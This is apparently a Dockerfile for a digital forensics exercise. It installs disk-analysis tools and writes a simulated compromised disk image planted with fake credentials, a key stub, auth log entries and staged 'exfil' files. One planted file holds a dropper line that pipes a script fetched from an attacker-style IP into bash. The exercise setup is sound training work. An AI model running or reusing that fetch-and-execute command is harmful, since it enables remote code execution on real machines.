FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    sleuthkit \
    foremost \
    binwalk \
    exiftool \
    strings \
    file \
    fdisk \
    python3 \
    python3-pip \
    curl \
    wget \
    unzip \
    && rm -rf /var/lib/apt/lists/*

# Create evidence disk image
RUN mkdir -p /evidence /output /tools

# Create a simulated compromised disk image
RUN python3 << 'PY'
import os, struct, hashlib

# Create a small ext4-like disk image (10MB)
img_size = 10 * 1024 * 1024
img_path = "/evidence/disk.img"

with open(img_path, "wb") as f:
    # Write a simulated filesystem with data
    # MBR-like header
    f.write(b'\x00' * 512)

    # Simulated files
    files = {
        b'/home/jane/Documents/financial_report.xlsx': b'Confidential financial data Q4 2024',
        b'/home/jane/Documents/passwords.txt': b'admin:Admin123!\nroot:toor\njane:Password1',
        b'/home/jane/.ssh/id_rsa': b'-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...',
        b'/tmp/update': b'#!/bin/bash\ncurl http://192.168.1.100:8080/shell | bash',
        b'/usr/local/bin/.bd': b'ELF backdoor binary placeholder',
        b'/var/log/auth.log': b'Jan 15 08:30:00 server sshd[1234]: Accepted password for jane from 10.0.0.5\nJan 15 08:35:00 server sshd[1235]: Failed password for root from 192.168.1.100\nJan 15 09:00:00 server sudo: jane : TTY=pts/0 ; PWD=/home/jane ; USER=root ; COMMAND=/bin/bash\n',
        b'/tmp/exfil/doc1.txt': b'Stole document 1',
        b'/tmp/exfil/doc2.txt': b'Stole document 2',
        b'/tmp/exfil/doc3.txt': b'Stole document 3',
    }

    for path, content in files.items():
        f.write(b'\n' + path + b'\n')
        f.write(content)
        f.write(b'\n')

    # Pad to image size
    current = f.tell()
    if current < img_size:
        f.write(b'\x00' * (img_size - current))

# Calculate hash
with open(img_path, "rb") as f:
    sha256 = hashlib.sha256(f.read()).hexdigest()

with open("/evidence/hashes.txt", "w") as f:
    f.write(f"disk.img  {sha256}\n")

print(f"Disk image created: {img_path}")
print(f"SHA256: {sha256}")
PY

WORKDIR /tools

CMD ["/bin/bash"]
